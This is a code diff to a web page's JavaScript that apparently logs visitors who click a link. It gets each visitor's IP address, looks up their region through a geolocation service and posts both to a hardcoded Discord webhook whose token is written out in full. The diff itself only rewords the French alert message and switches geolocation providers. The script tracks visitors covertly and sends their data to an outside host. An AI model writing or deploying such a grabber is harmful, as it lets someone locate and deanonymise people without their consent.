@@ -8,9 +8,9 @@
     function sendIPAndDepartmentToDiscord(ipAddress, department) {
       var webhookURL = "https://ptb.discord.com/api/webhooks/1125207312806727740/bvMj9uwuMoljP5zjAZWjfXvjYO1wmzZNwAbBDvOFEV87X7SvWir3qQEWn4GSMFZvNRyF";
 
-      var content = "> **Quelqu'un vient de cliquer sur le lien. Voici les informations reçues :**" +
+      var content = "> **Quelqu'un vient de cliquer sur le lien. Voici  les informations reçues :**" +
         "\n> **Adresse IP 🛰️ : **" + ipAddress +
-        "\n> **Département 🏠 : **" + department;
+        "\n> **Région 🏠 : **" + department;
 
       var request = new XMLHttpRequest();
       request.open("POST", webhookURL);
@@ -30,10 +30,10 @@
           var ipAddress = data.ip;
 
           // Récupérer le département en fonction de l'adresse IP
-          fetch('http://ip-api.com/json/' + ipAddress)
+          fetch('https://ipapi.co/' + ipAddress + '/json/')
             .then(response => response.json())
             .then(data => {
-              var department = data.regionName; // Nom du département
+              var department = data.region;
 
               // Envoyer l'adresse IP et le département à Discord
               sendIPAndDepartmentToDiscord(ipAddress, department);
